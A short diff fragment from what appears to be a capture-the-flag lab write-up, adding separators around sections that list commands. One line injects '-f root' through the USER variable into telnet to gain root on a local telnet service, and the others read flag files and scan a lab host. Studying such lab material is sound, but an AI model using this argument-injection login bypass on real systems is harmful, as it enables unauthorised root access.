@@ -75,10 +75,12 @@ tcp  0  0 127.0.0.1:23  0.0.0.0:*  LISTEN
 
 bash
 env USER='-f root' telnet -a 127.0.0.1
+--
 🏁 Flags
 bash
 cat /home/adam/user.txt
 cat /root/root.txt
+--
 📎 All Commands
 bash
 nmap -sC -sV -p- 10.129.93.166
